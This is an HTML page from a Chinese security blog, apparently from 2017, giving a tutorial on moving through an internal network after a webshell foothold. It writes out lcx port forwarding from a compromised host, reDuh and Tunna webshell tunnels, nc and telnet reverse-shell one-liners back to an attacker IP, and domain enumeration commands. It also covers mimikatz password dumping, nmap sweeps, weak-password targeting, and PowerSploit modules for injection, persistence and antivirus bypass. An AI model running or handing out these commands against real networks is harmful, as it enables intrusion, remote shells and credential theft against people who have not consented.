@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Mark一些内网漫游的知识 | ChaBug安全 | Www.ChaBug.Org</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="chabug,查bug,博客,寻找bug,初遇,chuyu,社区,Web,软件,分享,免费" />
+  
+
+  <meta name="description" content="当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。 注意本文较长，请耐心阅读。 内网转发的工具Lcx.exe工具使用首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）. lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的338">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mark一些内网漫游的知识">
+<meta property="og:url" content="http://www.chabug.org/2017/11/05/neiwang/index.html">
+<meta property="og:site_name" content="ChaBug安全 | Www.ChaBug.Org">
+<meta property="og:description" content="当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。 注意本文较长，请耐心阅读。 内网转发的工具Lcx.exe工具使用首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）. lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的338">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl709rlimyj30fe04laag.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl709rlp11j30fe032mxi.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl709rlvnbj30bh06edge.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl709rtqv8j30b60a7gmf.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dvdrdjj30al03ymx3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dve5khj30ev04xdfw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dvepjxj30fe05675f.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dvebctj30fe02574j.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dveww8j30bc06egm4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70dvew5lj30fe0as74z.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70ipcj5oj307l055dfq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70ipccknj30fe04ujrl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70ipj2cmj30fe02sgm1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70ipd407j30bm06it9c.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70ipfrlij30fe0agdga.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu49knj30cs01pmwz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4kh7j30ap024glh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4sdkj30fe01haa9.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu55pij30fe05ct9a.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4od1j30cl01g0si.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4g29j30cc00nwec.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lufr63j30fe01tq3s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70lu8loaj30fe09qmyq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70r11bxzj30fe08wgn1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70r11scpj30fe08smyx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hbj30fe03rdho.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70r13kwpj30fe05xjux.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hkj30en09f430.jpg">
+<meta property="og:updated_time" content="2017-11-05T03:03:36.376Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mark一些内网漫游的知识">
+<meta name="twitter:description" content="当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。 注意本文较长，请耐心阅读。 内网转发的工具Lcx.exe工具使用首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）. lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的338">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006xriynly1fl709rlimyj30fe04laag.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e7d0b4f222c86066771d7246bd3dd18c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">菜单</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">菜单</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            归档
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网转发的工具"><span class="toc-text">内网转发的工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lcx-exe工具使用"><span class="toc-text">Lcx.exe工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reduh内网反弹"><span class="toc-text">Reduh内网反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tunna内网反弹"><span class="toc-text">Tunna内网反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux系统通过nc反弹shell"><span class="toc-text">Linux系统通过nc反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内置命令反弹"><span class="toc-text">内置命令反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取更多服务器"><span class="toc-text">获取更多服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#密码获取"><span class="toc-text">密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#主机探测"><span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱口令"><span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#嗅探"><span class="toc-text">嗅探</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#powershell-amp-PowerSploit"><span class="toc-text">powershell & PowerSploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell的优秀之处"><span class="toc-text">Powershell的优秀之处</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerSploit"><span class="toc-text">PowerSploit</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-neiwang" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Mark一些内网漫游的知识</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.11.05</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>ChaBug</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://www.chabug.org/2017/11/05/neiwang/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。</p>
+<p><strong>注意本文较长，请耐心阅读。</strong></p>
+<h1 id="内网转发的工具"><a href="#内网转发的工具" class="headerlink" title="内网转发的工具"></a>内网转发的工具</h1><h2 id="Lcx-exe工具使用"><a href="#Lcx-exe工具使用" class="headerlink" title="Lcx.exe工具使用"></a>Lcx.exe工具使用</h2><p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
+<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
+<p>首先在本地进行监听，监听51端口并转发到33891端口</p>
+<p><code>lcx.exe -listen 51 33891</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlimyj30fe04laag.jpg" alt=""></p>
+<p>在webshell中运行</p>
+<p><code>lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlp11j30fe032mxi.jpg" alt=""></p>
+<p>远程桌面访问33891端口<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlvnbj30bh06edge.jpg" alt=""></p>
+<p>使用创建的用户名密码登录服务器<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rtqv8j30b60a7gmf.jpg" alt=""></p>
+<h2 id="Reduh内网反弹"><a href="#Reduh内网反弹" class="headerlink" title="Reduh内网反弹"></a>Reduh内网反弹</h2><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。<br>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvdrdjj30al03ymx3.jpg" alt=""></p>
+<p>浏览器中访问上传的webshell，提示以下内容说明解析成功</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dve5khj30ev04xdfw.jpg" alt=""></p>
+<p>用客户端连接服务端</p>
+<p><code>java -jar reDuhClient.jar http://192.168.80.139/zvuldrill/reDuh.php</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvepjxj30fe05675f.jpg" alt=""></p>
+<p>本地连接1010端口<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc.exe -vv localhost 1010</div><div class="line">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvebctj30fe02574j.jpg" alt=""></p>
+<p>远程登录</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dveww8j30bc06egm4.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvew5lj30fe0as74z.jpg" alt=""></p>
+<h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipcj5oj307l055dfq.jpg" alt=""></p>
+<p>这里使用php网站进行测试，上传php后门</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipccknj30fe04ujrl.jpg" alt=""></p>
+<p><code>python proxy.py -u http://192.168.80.139/zvuldrill/conn.php -l 1234 -r 3389 -v –s</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipj2cmj30fe02sgm1.jpg" alt=""></p>
+<p>远程连接</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipd407j30bm06it9c.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipfrlij30fe0agdga.jpg" alt=""></p>
+<h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>首先，攻击端进行监听</p>
+<p><code>nc.exe -lvnp 2333</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu49knj30cs01pmwz.jpg" alt=""></p>
+<p>服务器端执行</p>
+<p><code>mknod /tmp/backpipe p</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4kh7j30ap024glh.jpg" alt=""></p>
+<p><code>/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.101 2333 1&gt;/tmp/backpipe</code><br>Ip为攻击端ip<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4sdkj30fe01haa9.jpg" alt=""></p>
+<p>执行命令，查看发现反弹成功</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu55pij30fe05ct9a.jpg" alt=""></p>
+<h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><p><code>nc.exe -lvnp 2333</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4od1j30cl01g0si.jpg" alt=""><br>服务器端执行</p>
+<p><code>mknod /tmp/backpipe p</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4g29j30cc00nwec.jpg" alt=""><br><code>telnet 192.168.1.101 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lufr63j30fe01tq3s.jpg" alt=""></p>
+<p>反弹成功</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu8loaj30fe09qmyq.jpg" alt=""></p>
+<h1 id="获取更多服务器"><a href="#获取更多服务器" class="headerlink" title="获取更多服务器"></a>获取更多服务器</h1><p>上面讲了我们如何进入进入一台内网系统，既然我们已经获得了一台内网服务，那么我们如何获取更多服务器呢</p>
+<p>我们可能会想到目标系统是什么，安装了哪些应用，可能存在的漏洞等等。<br>同样，我们需要收集信息，来帮助更好的入侵其他主机，下面是一些常用的cmd命令，还有很多可自行学习<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">net user                               ------ 本机用户列表</div><div class="line">net localhroup administrators          ------ 本机管理员[通常含有域用户]</div><div class="line">net user /domain                       ------ 查询域用户</div><div class="line">net group /domain                      ------ 查询域里面的工作组</div><div class="line">net group &quot;domain admins&quot; /domain      ------ 查询域管理员用户组</div><div class="line">net localgroup administrators /domain  ------ 登录本机的域管理员</div><div class="line">net time /domain                       ------ 判断主域，主域服务器都做时间服务器</div><div class="line">net config workstation                 ------ 当前登录域</div></pre></td></tr></table></figure></p>
+<h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h2><p>既然已经拿下服务器，那么我们就要获得服务器的密码，windows可以使用mimikatz获取用户名及密码，因为很有可能管理员将其他系统设置成相同的用户名密码。所以在其他内网系统可能同样适用。<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r11bxzj30fe08wgn1.jpg" alt=""></p>
+<p>可以看到既有hash值，也有明文用户名密码。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r11scpj30fe08smyx.jpg" alt=""></p>
+<h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p>既然已经在一个内网，我们首先应该想到的就是探测有什么服务器，有哪些开放端口等等，可以使用nmap，扫描C段，看看有多少台在线服务器。</p>
+<p>扫描存活主机，既然是扫描存活主机，那么当然越快越好（个人喜好）</p>
+<p><code>nmap -PE -sn -T4 192.168.80.1/24</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hbj30fe03rdho.jpg" alt=""></p>
+<p>我们已经知道那些ip是存活主机，那么就可以进一步获取各个系统的开放端口</p>
+<p><code>nmap -sS -sV -O -p0-65535 192.168.80.145</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r13kwpj30fe05xjux.jpg" alt=""></p>
+<p>可以看到开放的端口以及服务等服务器信息</p>
+<p>同样，在内网也会存在很多不打系统补丁的情况，类似这次“WannaCry”虽然补丁已经出现一段时间，各大安全公司也好，各个安全部门也好都会提前预警打补丁，但是呢,你懂的，所以说，对某些不需要使用的端口及服务，直接停掉，以免临时抱佛脚，伤不起啊……<br>如果有系统漏洞，那么我们就可以使用matesploit进行溢出攻击等等</p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>同样，弱口令也是内网拿服务器的手段，说到弱口令就不得不说1433的mssql，3306的mysql，1521的Oracle，10050 的zabbix，7001的weblogic，8080的tomcat等等，都会存在弱口令的情况，但也存在被修改的情况，不过管理员嘛都是怕麻烦，会存在各种规律以免自己忘记，甚至有些管理员直接将某些账号密码写到某个文件夹中，这看你喽……</p>
+<h2 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h2><p>也可以使用嗅探方法，如Cain，可以探测本地程序缓存的密码，通过嗅探器可以嗅探到相邻机器的username和password.。</p>
+<h1 id="powershell-amp-PowerSploit"><a href="#powershell-amp-PowerSploit" class="headerlink" title="powershell &amp; PowerSploit"></a>powershell &amp; PowerSploit</h1><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>powershell基础学习，如果想了解powershell渗透测试原理，需要进行简单脚本开发。推荐网址：<a href="http://www.pstips.net/powershell-executing-external-commands.html" target="_blank" rel="external">http://www.pstips.net/powershell-executing-external-commands.html</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hkj30en09f430.jpg" alt=""><br>基础部分就不给大家在细介绍，大家可以根据提供网址进行学习。</p>
+<h2 id="Powershell的优秀之处"><a href="#Powershell的优秀之处" class="headerlink" title="Powershell的优秀之处"></a>Powershell的优秀之处</h2><ol>
+<li>代码运行在内存中可以不去接触磁盘</li>
+<li>从另一个系统中下载代码并执行</li>
+<li>很多安全产品并不能监测到powershell的活动</li>
+<li>cmd.exe通常被阻止运行，但是powershell不会。<br>本次主要是简单介绍下powersploit，后续会出一套关于powershell系列课程。</li>
+</ol>
+<h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p>
+<p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>代码执行（CodeExecution）</p>
+<ul>
+<li>Invoke-DllInjection</li>
+<li>Invoke-ReflectivePEInjection</li>
+<li>Invoke-Shellcode</li>
+<li>Invoke-WmiCommand</li>
+</ul>
+<p>脚本修改（ScriptModification）</p>
+<ul>
+<li>Out-EncodedCommand</li>
+<li>Out-CompressedDll</li>
+<li>Out-EncryptedScript</li>
+<li>Remove-Comments</li>
+</ul>
+<p>权限维持（Persistence）</p>
+<ul>
+<li>New-UserPersistenceOption</li>
+<li>New-ElevatedPersistenceOption</li>
+<li>Add-Persistence</li>
+<li>Install-SSP</li>
+<li>Get-SecurityPackages</li>
+</ul>
+<p>绕过杀毒软件（AntivirusBypass）</p>
+<ul>
+<li><p>Find-AVSignature<br>信息收集（Exfiltration）</p>
+</li>
+<li><p>这个文件夹主要是收集目标主机上的信息。<br>信息侦察（Recon）</p>
+</li>
+<li><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p>
+</li>
+</ul>
+<p>ending..</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持ChaBug</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/11/04/appnode-panel/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              归档
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'chabug';
+    
+    var disqus_url = 'http://www.chabug.org/2017/11/05/neiwang/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//chabug.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
